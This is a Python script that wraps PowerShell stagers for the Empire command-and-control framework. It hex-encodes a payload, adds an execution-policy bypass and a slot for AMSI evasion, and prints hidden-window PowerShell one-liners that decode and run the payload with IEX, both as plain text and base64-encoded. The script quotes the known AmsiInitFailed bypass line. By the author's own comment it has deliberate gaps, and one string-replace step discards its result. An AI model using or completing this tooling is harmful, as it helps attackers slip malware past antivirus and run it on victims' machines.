
#!/usr/bin/env python3

# Spice up and convert to hex, for Empire stagers - so they work properly
# Contains intentional gaps and issues as script-kiddy protection
# Not fully finished, a few features will come

import argparse
import sys
import base64

def p_base64_encode(input_string):
    # Step 1: Encode the string to UTF-16LE
    utf16le_bytes = input_string.encode('utf-16le')
    
    # Step 2: Base64 encode the UTF-16LE bytes
    base64_encoded = base64.b64encode(utf16le_bytes)
    
    # Step 3: Return the base64 encoded string
    return base64_encoded.decode('ascii')

def hex_encode(input_string):
    # Convert input string to a hex string without spaces
    return ''.join(f"{ord(i):02x}" for i in input_string)

def file_to_hex(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            return hex_encode(content)
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

def base64_to_hex(b64_string):
    try:
        decoded_bytes = base64.b64decode(b64_string)
        # Convert decoded bytes to a hex string without spaces
        return ''.join(f"{byte:02x}" for byte in decoded_bytes)
    except Exception as e:
        print(f"Error decoding Base64: {e}")
        sys.exit(1)

def construct_powershell_command(source_str):
    replace_Amsi = "[ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('AmsiInitFailed', 'NonPublic, Static').SetValue($null,$true);".lower()
    amsiEvasion = '<...enter working evasion...>'
    execution_policy = 'Set-ExecutionPolicy Bypass -Scope Process' 
    decoder = f'$hexString="{source_str}";$text = [System.Text.Encoding]::ASCII.GetString([byte[]] -split ($hexString -replace "..", "0x$& "));IEX $text'

    # If evasion is already inside, replace it with a working one
    if replace_Amsi in source_str.lower():
        source_str = source_str.lower()
        source_str.replace(replace_Amsi, amsiEvasion)

    command = f"""{execution_policy};{amsiEvasion};{decoder}"""
    command64 = p_base64_encode(command)

    powershell_command = f'powershell -sta -w 1 -noP -C {command}'
    b64_command = f'powershell -sta -w 1 -noP -enc {command64}'
    return powershell_command, b64_command

parser = argparse.ArgumentParser(description='Encode and execute PowerShell commands.')
parser.add_argument('-c', '--code', type=str, help='Direct code to encode.')
parser.add_argument('-f', '--file', type=str, help='File containing code to encode.')
parser.add_argument('-b', '--base64', type=str, help='Base64 encoded string to decode and encode.')

args = parser.parse_args()

if args.code:
    hex_string = hex_encode(args.code)
elif args.file:
    hex_string = file_to_hex(args.file)
elif args.base64:
    hex_string = base64_to_hex(args.base64)
else:
    parser.print_help()
    sys.exit(1)

final_command, b64_command = construct_powershell_command(hex_string)
print()
print(final_command)
print()
print(b64_command)
